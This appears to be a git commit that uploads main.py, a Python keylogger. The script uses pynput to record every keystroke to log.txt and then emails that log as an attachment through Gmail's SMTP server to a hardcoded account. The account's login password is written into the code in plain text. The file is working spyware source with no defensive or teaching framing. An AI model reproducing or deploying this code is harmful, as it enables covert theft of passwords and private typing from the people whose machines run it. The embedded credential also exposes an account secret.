697594a54e0c794283e2f36e949014b4b8241657
dangvuonglcps <82562887+dangvuonglcps@users.noreply.github.com>
2021-05-06 16:23:10 -0600

    Add files via upload

---
+++ main.py
@@ -0,0 +1,52 @@
+import pynput
+import smtplib
+from pynput import keyboard
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+
+def on_press(key):
+    key = str(key)
+    with open("log.txt", "a") as file:
+        file.write(key)
+    try:
+        print(key)
+    except AttributeError:
+        print(key)
+
+def on_release(key):
+    print(key)
+    if key == keyboard.Key.esc:
+        return False
+
+with keyboard.Listener(
+        on_press=on_press,
+        on_release=on_release) as listener:
+    listener.join()
+
+listener = keyboard.Listener(
+    on_press=on_press,
+    on_release=on_release)
+listener.start()
+
+sender_email = "nosystemissafe4321@gmail.com"
+receiver_email = "nosystemissafe4321@gmail.com"
+message = MIMEMultipart()
+message["From"] = sender_email
+message['To'] = receiver_email
+message['Subject'] = "sending mail using python"
+file = "log.txt"
+attachment = open(file,'rb')
+obj = MIMEBase('application','octet-stream')
+obj.set_payload((attachment).read())
+encoders.encode_base64(obj)
+obj.add_header('Content-Disposition',"attachment; filename= "+file)
+message.attach(obj)
+my_message = message.as_string()
+email_session = smtplib.SMTP('smtp.gmail.com',587)
+email_session.starttls()
+email_session.login(sender_email,'Anonymous12345677')
+email_session.sendmail(sender_email,receiver_email,my_message)
+email_session.quit()
+print("YOUR MAIL HAS BEEN SENT SUCCESSFULLY")
